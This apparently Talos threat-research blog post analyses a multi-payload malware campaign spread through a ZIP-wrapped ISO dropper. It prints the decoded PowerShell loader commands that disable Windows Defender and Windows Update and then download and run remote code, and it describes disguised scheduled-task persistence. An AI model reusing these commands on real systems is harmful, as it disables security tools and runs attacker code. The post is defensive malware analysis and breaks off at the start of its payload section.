        <div class="post-content">
            <p><i>By <a href="https://twitter.com/vanjasvajcer">Vanja Svajcer</a>.</i></p><h3 id="news-summary">NEWS SUMMARY <br></h3><ul><li>We are used to ransomware attacks and big game hunting making the headlines, but there is an undercurrent of other attack types that allow attackers to monetize their efforts in a less intrusive way.</li><li>Here, we discuss a multi-pronged cyber criminal attack using a number of techniques that should alert blue team members with appropriate monitoring capability but are not immediately obvious to end-users.</li><li>These threats demonstrate several techniques of the <a href="https://attack.mitre.org/">MITRE ATT&amp;CK framework</a>, most notably <a href="https://attack.mitre.org/techniques/T1089/">T1089</a> (Disabling Security Tools), <a href="https://attack.mitre.org/techniques/T1105/">T1105</a> (Remote File Copy), <a href="https://attack.mitre.org/techniques/T1027/">T1027</a> (Obfuscated Files or Information), <a href="https://attack.mitre.org/techniques/T1086/">T1086</a> (PowerShell), <a href="https://attack.mitre.org/techniques/T1202/">T1202</a> (Indirect Command Execution), <a href="https://attack.mitre.org/techniques/T1055/">T1055</a> (Process Injection), <a href="https://attack.mitre.org/techniques/T1064/">T1064</a>(Scripting), <a href="https://attack.mitre.org/techniques/T1053/">T1053</a> (Scheduled Task) and <a href="https://attack.mitre.org/techniques/T1011/">T1011</a> (Exfiltration Over Other Network Medium) Attackers are constantly reinventing ways of monetizing their tools. Cisco Talos recently discovered a complex campaign with several different executable payloads, all focused on providing financial benefits for the attacker in a slightly different way. The first payload is a Monero cryptocurrency miner based on XMRigCC, and the second is a trojan that monitors the clipboard and replaces its content. There's also a variant of the infamous <a href="https://attack.mitre.org/software/S0344/">AZORult</a> information-stealing malware, a variant of <a href="https://blog.talosintelligence.com/picking-apart-remcos/">Remcos</a> remote access tool and, finally, the <a href="https://reaqta.com/2017/11/short-journey-darkvnc/">DarkVNC</a> backdoor trojan.</li></ul><h4 id="what-s-new-embedding-an-executable-downloader-in-an-iso-image-file-is-a-relatively-new-method-of-delivery-for-azorult-it-s-also-unusual-to-see-attackers-using-multiple-methods-to-make-money-">What's new? <br> Embedding an executable downloader in an ISO image file is a relatively new method of delivery for AZORult. It's also unusual to see attackers using multiple methods to make money.</h4><h4 id="how-did-it-work-the-infection-chain-starts-with-a-zip-file-which-contains-an-iso-disk-image-file-when-the-user-opens-the-iso-file-a-disk-image-containing-an-executable-loader-is-mounted-when-the-loader-is-launched-it-deobfuscates-malicious-code-which-downloads-the-first-obfuscated-powershell-loader-stage-that-kickstarts-the-overall-infection-disables-security-tools-and-windows-update-service-and-downloads-and-launches-the-payloads-">How did it work? <br> The infection chain starts with a ZIP file, which contains an ISO disk image file. When the user opens the ISO file, a disk image containing an executable loader is mounted. When the loader is launched, it deobfuscates malicious code which downloads the first obfuscated PowerShell loader stage that kickstarts the overall infection, disables security tools and Windows update service and downloads and launches the payloads.</h4><h4 id="so-what-defenders-need-to-be-constantly-vigilant-and-monitor-the-behavior-of-systems-within-their-network-attackers-are-like-water-they-will-attempt-to-find-the-smallest-crack-to-achieve-their-goals-while-organizations-need-to-be-focused-on-protecting-their-most-valuable-assets-they-should-not-ignore-threats-that-are-not-particularly-targeted-toward-their-infrastructure-">So what? <br> Defenders need to be constantly vigilant and monitor the behavior of systems within their network. Attackers are like water  they will attempt to find the smallest crack to achieve their goals. While organizations need to be focused on protecting their most valuable assets, they should not ignore threats that are not particularly targeted toward their infrastructure.</h4><h3 id="technical-case-overview">Technical case overview</h3><h4 id="introduction-the-initial-trigger-for-this-investigation-was-a-telemetry-entry-that-showed-a-powershell-process-launching-a-download-and-executing-a-powershell-loader-">Introduction The initial trigger for this investigation was a telemetry entry that showed a PowerShell process launching a download and executing a PowerShell loader.</h4><p>After the drill-down, the telemetry shows that the PowerShell downloading code was launched by an executable dropper included in an ISO image that's mounted within the operating system by the user. The ISO image seems to have been downloaded compressed with ZIP, possibly encrypted with a password, which indicates it's primarily spread via email.</p><h4 id="executable-dropper-with-anti-sandboxing-the-dropper-s-functionality-is-rather-simple-but-the-code-contains-some-interesting-features-all-malicious-api-calls-are-resolved-dynamically-but-locating-the-peb-and-traversing-one-of-the-lists-of-loaded-modules-in-memory-to-find-the-module-address-from-there-the-downloader-goes-through-the-export-table-in-order-to-find-and-return-the-address-of-the-required-functions-which-is-then-indirectly-called-using-one-of-the-call-reg-instructions-">Executable dropper with anti-sandboxing The dropper's functionality is rather simple, but the code contains some interesting features. All malicious API calls are resolved dynamically but locating the PEB and traversing one of the lists of loaded modules in memory to find the module address. From there, the downloader goes through the export table in order to find and return the address of the required functions which is then indirectly called using one of the 'call reg' instructions.</h4><p>All strings, including the entire command line for the downloader PowerShell code are encrypted with a static byte key, different for each string, which also gets decrypted during the execution.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/-JCyS7tYqPb8/XoMYho6H1HI/AAAAAAAAAaA/YSBz7M111yQ_noqj0u4G0QQDEl3A8bZKACLcBGAsYHQ/s640/image14.png" class="kg-image" alt loading="lazy"></figure><p><i>Command-line for the PowerShell downloader is deobfuscated using a byte XOR key.</i> <br> The most interesting feature is the function that randomly calls APIs from the lists twice. First, two randomly generated numbers from 0 to 9 are generated by a pseudo-random number generator and those numbers  m and n are used as parameters for the function.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/-h8YH_bSgfz8/XoMYqJCYTzI/AAAAAAAAAaI/BXbIUsmA1nMENTMQSLzcvWMP4u-nhsg6gCLcBGAsYHQ/s1600/image3.png" class="kg-image" alt loading="lazy"></figure><p><i>Random API calls function</i> <br> The function first randomly chooses and calls m and then n APIs from the list:</p><ul><li>GetCommandLineA</li><li>GetTickCount</li><li>GetLastError</li><li>GetSystemDefaultLangID</li><li>GetCurrentProcess</li><li>GetProcessHeap</li><li>GetEnvironmentStrings <br> This is likely done to confuse behavioral detectors, emulators and sandboxes which may base their detections on sequences of executed API calls.</li></ul><p>The downloader eventually calls the MessageBox API to display a fake error message.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/-6YdhK16fCh8/XoMY361Y6xI/AAAAAAAAAaQ/XIoO4L0D2ac7IJFY8CLvHSKSgVVj0HZowCLcBGAsYHQ/s640/image6.png" class="kg-image" alt loading="lazy"></figure><p><i>Executable downloader fake error message.</i> <br></p><h4 id="first-stage-powershell-loader-the-first-stage-of-the-powershell-loader-is-a-simple-command-line-">First stage PowerShell loader The first stage of the PowerShell loader is a simple command line:</h4><p>When the base64 command-line option is decoded, we reach the actual downloading code which uses githubusercontent.com to first disable Windows Defender, stop Windows update, download and execute the next malware stage using the Invoke-Expression cmdlet.</p><pre><code>Set-MpPreference -DisableRealtimeMonitoring $true

cmd /c reg add 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f

cmd /c sc stop wuauserv\r\ncmd /c sc config wuauserv start= disabled

iex ((New-Object 
System.Net.WebClient).DownloadString('hxxps://gist[.]githubusercontent[.]com/mysslacc/a5b184d9d002bf04007c4bbd2a53eeea/raw/c6f8b4c36e48425507271962855f3e2ac695f99f/baseba'))</code></pre><p>The downloaded PowerShell script is first base64-decoded and decrypted using the cmdlet <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view%3Dpowershell-7">ConvertTo-SecureString</a>. The result is an obfuscated PowerShell script with several layers of obfuscation, a result of applying the Invoke-Obfuscation method to the initial code. Once deobfuscated, we can see the functionality of the PowerShell loader.</p><h4 id="powershell-loader-the-powershell-script-downloaded-and-executed-by-the-executable-downloader-is-responsible-for-the-installation-of-payloads-and-ensuring-that-they-stay-persistent-after-user-logs-out-all-the-payloads-are-downloaded-from-external-sites-">PowerShell loader <br> The PowerShell script downloaded and executed by the executable downloader is responsible for the installation of payloads and ensuring that they stay persistent after user logs out. All the payloads are downloaded from external sites.</h4><p>The loader first sets the PowerShell preferences so that the warning and error messages are not displayed and so that the script continues executing if an error is encountered.</p><pre><code>$WarningPreference = "SilentlyContinue"

$erroractionpreference = "SilentlyContinue"
</code></pre><p><br> The execution continues with checking the current privileges. The loader behaves differently if the user has administrative privileges.</p><p>If the user does not have administrative privileges, the loader creates the registry value HKCU\Software\Kumi and stores a base64 encoded string that contains code to download and execute a variant of <a href="https://github.com/Bendr0id/xmrigCC">XMRigCC</a> cryptocurrency miner. It then creates a scheduled task with the name OneDrive SyncTask to execute hourly and launch the miner which is read from the previously created registry entry.</p><p>If the user belongs to the administrators' group, the loader will first create exclusion folders for the Windows Defender so that certain folders are not scanned and then attempt to disable various Defender's user notifications so that the user is not notified if any of the components in the attack are detected. Malwarebytes anti-malware service will also be stopped and deleted if it exists on the computer.</p><p>Finally, if the loader has administrative privileges it will attempt to create three services WinDefends, thundersec and WindowsNetworkSVC, and create three scheduled tasks to launch those services on an hourly basis. The task names are \Microsoft\Windows\Shell\updshell, \Microsoft\Windows\Autochk\SystemProxy and \Microsoft\Windows\MobilePC\DetectPC.</p><p>At the time of writing, the first URL contained a loader for either a variant of Remcos remote access tool or a variant of DarkVNC remote access trojan. If the user has administrative privileges, the loader launches Remcos. Otherwise, it launches DarkVNC.</p><p>The loader then downloads and launches a clipboard modification trojan from githubusercontent.com with the filename clp.exe in the user's temporary folder. This cryptocurrency stealer is described later.</p><p>Regardless of the permissions, the loader will create a registry value HKCU\Software\cr\d and store the code to download and launch one of the above backdoor trojans and creates a scheduled task "Update Shell" to run every five hours. The task retrieves the value stored as a base64 encoded string in the registry and downloads code from the URL hxxps://raw[.]githubusercontent[.]com/mysslacc/thd/master/base.</p><p>Finally, the loader uses a process injector RunPE to inject a variant of the Azorult information-stealing trojan into the notepad.exe process.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/-_ERrLreuuJo/XoMZBN6I6YI/AAAAAAAAAaY/wsYL06rvLGcEG4qbPKUpJNQ2dTkwxYpOgCLcBGAsYHQ/s640/image2.png" class="kg-image" alt loading="lazy"></figure><p><i>Process tree of the PowerShell loader as seen in Cisco Threat Grid</i> <br></p><h4 id="payloads">Payloads</h4><h4 id="xmrigcc-cryptominer-perhaps-the-least-interesting-payload-installed-by-the-loader-xmrigcc-is-a-variant-of-an-open-source-miner-that-can-be-controlled-through-a-command-and-control-c2-console-xmrigcc-has-its-own-loader-which-is-called-by-decoding-and-executing-the-content-of-the-variable-kumi-of-the-main-loader-">XMRigCC cryptominer <br> Perhaps the least interesting payload installed by the loader, XMRigCC is a variant of an open-source miner that can be controlled through a command and control (C2) console.
